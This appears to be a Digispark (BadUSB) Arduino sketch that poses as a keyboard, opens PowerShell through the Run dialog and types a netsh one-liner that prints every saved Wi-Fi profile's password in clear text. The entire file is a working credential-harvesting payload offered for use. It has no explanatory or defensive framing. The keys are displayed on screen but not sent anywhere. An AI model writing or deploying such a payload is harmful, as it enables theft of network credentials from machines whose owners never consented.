#include "DigiKeyboard.h"

void setup(){
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(Key_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);

  DigiKeyboard.println("netsh wlan show profiles | Select-String \":(.+)$\" | %{$profile=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$profile\" key=clear)}");
}

void look() {
}

